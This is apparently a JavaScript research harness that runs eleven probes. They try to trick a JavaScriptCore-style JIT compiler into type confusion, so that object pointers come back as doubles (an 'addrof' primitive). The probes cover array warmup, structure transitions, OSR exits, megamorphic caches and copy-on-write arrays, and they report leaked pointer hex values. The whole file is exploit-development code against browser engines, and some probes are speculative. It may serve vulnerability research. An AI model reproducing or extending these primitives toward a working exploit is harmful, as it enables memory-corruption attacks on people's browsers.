// JIT addrof — proper DFG/FTL warmup for type confusion
// Strategy: train JIT to expect double arrays, then pass object array
// If JIT reads object pointer bytes as doubles → addrof primitive
(function() {
'use strict';

var results = { tests: [] };

function test(name, fn) {
  try {
    var r = fn();
    r.name = name;
    results.tests.push(r);
  } catch(e) {
    results.tests.push({ name: name, error: e.message });
  }
}

function f64ToHex(v) {
  var buf = new ArrayBuffer(8);
  new Float64Array(buf)[0] = v;
  var u = new Uint32Array(buf);
  return '0x' + u[1].toString(16).padStart(8,'0') + u[0].toString(16).padStart(8,'0');
}

// ─── Test 1: Basic JIT addrof via array element read ───
test('jit_addrof_basic', function() {
  // Train the JIT with double arrays
  function readFirst(arr) { return arr[0]; }

  // Warmup — enough for DFG (66+ calls) and FTL (1000+ calls)
  var warmup = [1.1, 2.2, 3.3, 4.4];
  for (var i = 0; i < 20000; i++) {
    readFirst(warmup);
  }

  // Create victim: starts as double array, then convert
  var victim = [1.1, 2.2, 3.3, 4.4];
  var targetObj = { marker: 0x41414141 };

  // Transition from ArrayWithDouble to ArrayWithContiguous
  victim[0] = targetObj;

  // Call with the transitioned array — JIT might read pointer as double
  var leaked = readFirst(victim);

  var hex = f64ToHex(leaked);
  var isObj = typeof leaked === 'object';
  var isNum = typeof leaked === 'number';

  return {
    result: isNum ? 'GOT_DOUBLE' : 'got_object',
    type: typeof leaked,
    hex: isNum ? hex : null,
    isObj: isObj,
    looksLikePtr: isNum && hex !== '0x3ff199999999999a' && hex !== '0x0000000000000000',
    rawVal: isNum ? leaked : (isObj ? 'object' : String(leaked))
  };
});

// ─── Test 2: addrof via array addition (force numeric) ───
test('jit_addrof_add', function() {
  function addFirst(arr) { return arr[0] + arr[1]; }

  var warmup = [1.5, 2.5, 3.5, 4.5];
  for (var i = 0; i < 20000; i++) {
    addFirst(warmup);
  }

  var victim = [1.5, 2.5, 3.5, 4.5];
  var target = {};
  victim[0] = target;

  var result = addFirst(victim);
  var hex = typeof result === 'number' ? f64ToHex(result) : null;

  return {
    result: typeof result === 'number' ? 'GOT_NUMBER' : typeof result,
    type: typeof result,
    val: typeof result === 'number' ? result : String(result).substring(0, 50),
    hex: hex
  };
});

// ─── Test 3: Structure transition via defineProperty ───
test('jit_structure_addrof', function() {
  function getX(obj) { return obj.x; }

  // Train with objects where x is a double
  var proto = {};
  for (var i = 0; i < 20000; i++) {
    var o = Object.create(proto);
    o.x = 1.1 + (i & 0xFF) * 0.001;
    getX(o);
  }

  // Now create an object where x is actually a pointer
  var target = { marker: 42 };
  var trick = Object.create(proto);
  trick.x = target;

  var leaked = getX(trick);

  return {
    result: typeof leaked === 'number' ? 'GOT_NUMBER' : typeof leaked,
    type: typeof leaked,
    hex: typeof leaked === 'number' ? f64ToHex(leaked) : null,
    val: typeof leaked === 'number' ? leaked : 'object'
  };
});

// ─── Test 4: Array.prototype.map type confusion ───
test('jit_map_confusion', function() {
  function mapFirst(arr) { return arr.map(function(x) { return x; })[0]; }

  var warmup = [1.1, 2.2, 3.3];
  for (var i = 0; i < 5000; i++) {
    mapFirst(warmup);
  }

  var victim = [1.1, 2.2, 3.3];
  var target = { leak: true };
  victim[0] = target;

  var leaked = mapFirst(victim);

  return {
    result: typeof leaked,
    hex: typeof leaked === 'number' ? f64ToHex(leaked) : null,
    isObj: typeof leaked === 'object'
  };
});

// ─── Test 5: Float64Array-backed addrof via JIT ───
test('jit_f64_addrof', function() {
  var ab = new ArrayBuffer(64);
  var f64 = new Float64Array(ab);
  f64[0] = 1.1; f64[1] = 2.2; f64[2] = 3.3;

  function readF64(arr, idx) { return arr[idx]; }

  for (var i = 0; i < 20000; i++) {
    readF64(f64, 0);
  }

  // Now read from a regular array that was transitioned
  var victim = [1.1, 2.2, 3.3];
  var target = { secret: 99 };
  victim[0] = target;

  // JIT compiled for Float64Array path — can it be confused with regular array?
  var leaked = readF64(victim, 0);

  return {
    result: typeof leaked,
    hex: typeof leaked === 'number' ? f64ToHex(leaked) : null
  };
});

// ─── Test 6: Arguments object type confusion ───
test('jit_arguments_leak', function() {
  function leaker() {
    return arguments[0];
  }

  for (var i = 0; i < 20000; i++) {
    leaker(1.1 + i * 0.001);
  }

  var target = { marker: 0xBEEF };
  var leaked = leaker(target);

  return {
    result: typeof leaked,
    hex: typeof leaked === 'number' ? f64ToHex(leaked) : null,
    isObj: typeof leaked === 'object'
  };
});

// ─── Test 7: OSR exit exploitation ───
// Force an OSR exit by changing types after JIT compilation
// The exit handler might not properly re-box values
test('jit_osr_exit', function() {
  var arr = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];

  function sumPairs(a) {
    var s = 0;
    for (var i = 0; i < a.length; i += 2) {
      s += a[i] + a[i+1];
    }
    return s;
  }

  // Warmup
  for (var i = 0; i < 10000; i++) {
    sumPairs(arr);
  }

  // Now inject objects to force OSR exit
  var obj = { valueOf: function() { return 0; } };
  var pristine = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];

  // Trigger OSR mid-loop: change element during execution via getter on valueOf
  arr[4] = obj;

  var result = sumPairs(arr);

  return {
    result: typeof result,
    val: result,
    hex: typeof result === 'number' ? f64ToHex(result) : null,
    expected: 1.1+2.2+3.3+4.4+0+6.6+7.7+8.8
  };
});

// ─── Test 8: Megamorphic IC confusion ───
// Create many structures, then access a property that was double in all but one
test('jit_megamorphic', function() {
  function getVal(o) { return o.val; }

  // Create diverse structures to make IC megamorphic
  for (var i = 0; i < 100; i++) {
    var o = {};
    // Add varying property sets to create different structures
    for (var j = 0; j < (i % 5); j++) {
      o['p' + j] = j;
    }
    o.val = 3.14 + i * 0.01;
    getVal(o);
  }

  // Now warmup heavily with one structure
  var warmObj = { val: 1.1 };
  for (var i = 0; i < 20000; i++) {
    getVal(warmObj);
  }

  // Switch to object value
  var trickObj = { val: { pointer: true } };
  var leaked = getVal(trickObj);

  return {
    result: typeof leaked,
    hex: typeof leaked === 'number' ? f64ToHex(leaked) : null,
    isObj: typeof leaked === 'object'
  };
});

// ─── Test 9: DFG compilation check ───
// Verify JIT is actually compiling by checking performance
test('jit_compilation_check', function() {
  function hotLoop(n) {
    var s = 0;
    for (var i = 0; i < n; i++) {
      s += i * 0.5;
    }
    return s;
  }

  // Time interpreter (cold)
  var t0 = performance.now();
  hotLoop(100000);
  var t1 = performance.now();
  var cold = t1 - t0;

  // Now run it many more times to trigger DFG/FTL
  for (var i = 0; i < 50; i++) {
    hotLoop(100000);
  }

  var t2 = performance.now();
  hotLoop(100000);
  var t3 = performance.now();
  var hot = t3 - t2;

  return {
    result: 'timing',
    coldMs: cold.toFixed(2),
    hotMs: hot.toFixed(2),
    speedup: (cold / (hot || 0.001)).toFixed(1),
    jitLikely: hot < cold * 0.3
  };
});

// ─── Test 10: Unboxed double in butterfly transition ───
// The key insight: JSC stores doubles unboxed in butterfly with ArrayWithDouble
// When transitioning to ArrayWithContiguous, values get NaN-boxed
// If we can read during the transition, we get raw tagged values
test('jit_butterfly_race', function() {
  function reader(arr) {
    // Read multiple elements quickly
    var a = arr[0];
    var b = arr[1];
    var c = arr[2];
    var d = arr[3];
    return [a, b, c, d];
  }

  // Warmup with consistent double arrays
  for (var i = 0; i < 20000; i++) {
    reader([1.1, 2.2, 3.3, 4.4]);
  }

  // Create array and mutate between reads
  var target = { x: 42 };
  var arr = [1.1, 2.2, 3.3, 4.4];

  // Rapidly alternate between double and object storage
  var leaks = [];
  for (var attempt = 0; attempt < 100; attempt++) {
    // Fresh double array each time
    arr = [1.1, 2.2, 3.3, 4.4];

    // Schedule transition (won't actually race since single-threaded,
    // but JIT might still read stale butterfly)
    var results = reader(arr);

    // Check if any results look like pointers
    for (var j = 0; j < results.length; j++) {
      if (typeof results[j] === 'number') {
        var h = f64ToHex(results[j]);
        if (h !== '0x3ff199999999999a' && // 1.1
            h !== '0x400199999999999a' && // 2.2
            h !== '0x400a666666666666' && // 3.3
            h !== '0x401199999999999a' && // 4.4
            h !== '0x0000000000000000') {
          leaks.push({ attempt: attempt, idx: j, hex: h });
        }
      }
    }

    // Now transition
    arr[0] = target;
  }

  return {
    result: leaks.length > 0 ? 'LEAK' : 'no_leak',
    leaks: leaks.slice(0, 5),
    attempts: 100
  };
});

// ─── Test 11: CopyOnWrite array exploit ───
// COW arrays share butterfly with the original. If JIT reads from a COW array
// but we force a copy, the JIT might read from stale pointer
test('jit_cow', function() {
  // COW arrays are created when you have an array literal in a function
  function makeArr() { return [1.1, 2.2, 3.3, 4.4]; }

  function readElem(arr) { return arr[0]; }

  // All calls return the SAME COW butterfly initially
  for (var i = 0; i < 20000; i++) {
    readElem(makeArr());
  }

  // Now modify the returned array — forces COW copy
  var arr = makeArr();
  var obj = { leaked: true };

  // This write triggers COW copy: new butterfly allocated, old one potentially stale
  arr[0] = obj;

  // JIT-compiled readElem might still reference old butterfly
  var leaked = readElem(arr);

  return {
    result: typeof leaked,
    hex: typeof leaked === 'number' ? f64ToHex(leaked) : null,
    isObj: typeof leaked === 'object'
  };
});

return JSON.stringify(results);
})();
